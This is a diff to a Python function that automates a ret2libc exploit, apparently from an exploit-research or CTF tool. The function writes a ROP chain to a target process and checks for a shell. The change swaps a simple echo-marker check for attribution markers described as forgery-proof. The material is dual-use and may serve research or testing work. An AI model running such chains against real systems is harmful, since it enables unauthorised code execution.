@@ -379,7 +379,8 @@ def analyst_ret2libc(exe, workdir, *, offset, libc_data, leak_offset=None, leak_
     import re as _re
     import struct as _struct
 
-    from . import rop
+    from . import attribution, rop
+    markers = attribution.make_code_markers()            # forgery-proof: an echo can't fake a shell
     auto = leak_offset is None and not leak_sym          # no slot named -> auto-classify the dump
     if leak_offset is None and leak_sym:
         leak_offset = rop.libc_symbols(libc_data, (leak_sym,)).get(leak_sym)
@@ -456,12 +457,12 @@ def analyst_ret2libc(exe, workdir, *, offset, libc_data, leak_offset=None, leak_
                     p.stdin.write(bytes(chain))
                     p.stdin.flush()
                     time.sleep(0.3)
-                    p.stdin.write(b"echo " + marker + b"\n")
+                    p.stdin.write(markers.command + b"\n")
                     p.stdin.flush()
                 except (BrokenPipeError, OSError):
                     break                                        # wrong parity: crashed
                 out = _read_until(p, time.time() + timeout, quiet=1.5)
-                if marker in out:
+                if markers.proves(out):
                     r = {"ok": True, "base": base, "pad": pad, "tail": tail_name,
                          "output": out[:400].decode("latin-1", "ignore")}
                     if system:
